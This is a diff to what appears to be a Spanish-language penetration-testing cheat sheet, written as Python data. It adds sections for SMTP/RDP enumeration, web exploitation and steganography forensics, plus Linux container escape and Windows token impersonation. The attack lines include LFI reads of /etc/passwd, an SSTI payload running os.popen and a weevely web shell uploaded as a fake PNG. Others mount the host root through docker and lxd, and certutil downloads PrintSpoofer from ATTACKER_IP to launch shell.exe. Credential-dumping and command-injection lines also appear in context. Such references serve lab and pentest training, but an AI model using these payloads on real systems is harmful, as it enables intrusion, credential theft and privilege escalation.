@@ -389,6 +389,14 @@ SECTIONS = [
                 "psql -h $IP -U postgres",
                 "redis-cli -h $IP",
             ]),
+            ("h2", "SMTP (25) / RDP (3389)"),
+            ("code", [
+                "nc -nv $IP 25",
+                "smtp-user-enum -M VRFY -U users.txt -t $IP",
+                "swaks --to test@$DOMAIN --server $IP",
+                "xfreerdp /v:$IP /u:$USER /p:$PASS +clipboard /dynamic-resolution",
+                "nmap --script rdp-enum-encryption -p 3389 $IP",
+            ]),
             ("h2", "Servicios tipicos"),
             ("table", [
                 ["Servicio", "Comandos utiles"],
@@ -446,6 +454,19 @@ SECTIONS = [
                 "curl -sS -X POST \"$URL/api/ping\" -H 'Content-Type: application/json' -d '{\"host\":\"127.0.0.1; id\"}'",
                 "curl -sS \"$URL/api/me\" -H \"Authorization: Bearer $TOKEN\"",
                 "sqlmap -r request.txt --batch --level 3",
+            ]),
+            ("h2", "Explotacion web (LFI / SSTI / upload)"),
+            ("code", [
+                "curl -sS \"$URL/page.php?file=../../../../etc/passwd\"",
+                "curl -sS \"$URL/page.php?file=php://filter/convert.base64-encode/resource=index.php\"",
+                "curl -sS \"$URL/page.php?file=/proc/self/environ\"",
+                "curl -sS \"$URL/?name={{7*7}}\"",
+                "curl -sS \"$URL/?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}\"",
+                "weevely generate S3cr3t shell.php",
+                "curl -sS -F 'file=@shell.phtml;type=image/png' \"$URL/upload\"",
+                "weevely $URL/uploads/shell.php S3cr3t",
+                "git-dumper $URL/.git/ ./loot_git",
+                "curl -sS \"$URL/.git/HEAD\"",
             ]),
             ("h2", "Triage de bugs"),
             ("table", [
@@ -549,6 +570,16 @@ SECTIONS = [
                 "lazagne.exe all",
                 "python3 lazagne.py browsers",
             ]),
+            ("h2", "Stego y forense de ficheros"),
+            ("code", [
+                "file archivo; strings -n 8 archivo",
+                "exiftool imagen.jpg",
+                "binwalk -e archivo",
+                "steghide info imagen.jpg ; steghide extract -sf imagen.jpg",
+                "stegseek imagen.jpg /usr/share/wordlists/rockyou.txt",
+                "zsteg -a imagen.png",
+                "foremost -i archivo -o salida",
+            ]),
             ("bullets", [
                 "Firefox guarda logins en logins.json + key4.db; con firefox_decrypt sacas las passwords en claro.",
                 "Etiqueta cada credencial por fuente y servicio probado.",
@@ -598,11 +629,8 @@ SECTIONS = [
             ("p", "La regla: si puedes modificar algo que otro usuario mas privilegiado ejecuta o lee, tienes un vector potencial."),
             ("code", [
                 "whoami; id; groups; hostname; pwd",
-                "sudo -l",
                 "find / -perm -4000 -type f -ls 2>/dev/null",
-                "getcap -r / 2>/dev/null",
                 "find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys|^/dev'",
-                "cat /etc/crontab; ls -la /etc/cron.*",
                 "systemctl list-timers 2>/dev/null",
             ]),
             ("h2", "Automatizado"),
@@ -653,6 +681,15 @@ SECTIONS = [
             ("code", [
                 "uname -a; cat /etc/os-release",
                 "searchsploit linux kernel <version>",
+            ]),
+            ("h2", "Contenedores (docker / lxd)"),
+            ("code", [
+                "id",
+                "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+                "lxc image import ./alpine.tar.gz --alias privesc",
+                "lxc init privesc r00t -c security.privileged=true",
+                "lxc config device add r00t host disk source=/ path=/mnt/root recursive=true",
+                "lxc start r00t && lxc exec r00t /bin/sh",
             ]),
             ("table", [
                 ["Vector", "Que mirar"],
@@ -737,6 +774,13 @@ SECTIONS = [
                 "type C:\\Windows\\Panther\\Unattend.xml 2>nul",
                 "type C:\\Windows\\Panther\\Unattended.xml 2>nul",
                 "type %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul",
+            ]),
+            ("h2", "Token / SeImpersonate (potato)"),
+            ("code", [
+                "certutil -urlcache -split -f http://ATTACKER_IP:8000/PrintSpoofer64.exe C:\\Windows\\Temp\\ps.exe",
+                "C:\\Windows\\Temp\\ps.exe -i -c \"C:\\Windows\\Temp\\shell.exe\"",
+                "C:\\Windows\\Temp\\GodPotato.exe -cmd \"cmd /c whoami\"",
+                "JuicyPotato.exe -l 1337 -p C:\\Windows\\Temp\\shell.exe -t *",
             ]),
             ("table", [
                 ["Vector", "Senal"],
